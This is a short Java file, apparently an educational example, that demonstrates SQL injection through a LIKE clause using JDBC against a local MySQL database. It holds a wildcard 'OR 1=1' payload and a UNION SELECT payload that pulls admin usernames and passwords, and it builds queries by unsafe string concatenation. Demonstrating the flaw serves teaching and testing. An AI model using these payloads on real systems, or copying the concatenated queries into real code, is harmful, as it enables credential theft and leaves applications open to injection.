// LIKE / Wildcard SQL Injection via JDBC
// Attacker abuses the LIKE clause with wildcards to widen matches and leak data.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class like_wildcard_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: % wildcard matches everything after the injected quote
        String search = "%' OR '1'='1";
        String query = "SELECT id, name FROM users WHERE name LIKE '" + search + "%'";

        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("Like match: " + rs.getString("name"));
        }

        // Union via wildcard context to leak credentials
        String union = "' UNION SELECT username, password FROM admins -- ";
        String unionQuery = "SELECT id, name FROM users WHERE name LIKE '" + union + "'";
        ResultSet urs = st.executeQuery(unionQuery);
        while (urs.next()) {
            System.out.println("Credential: " + urs.getString(1) + " / " + urs.getString(2));
        }

        rs.close();
        urs.close();
        st.close();
        con.close();
    }
}
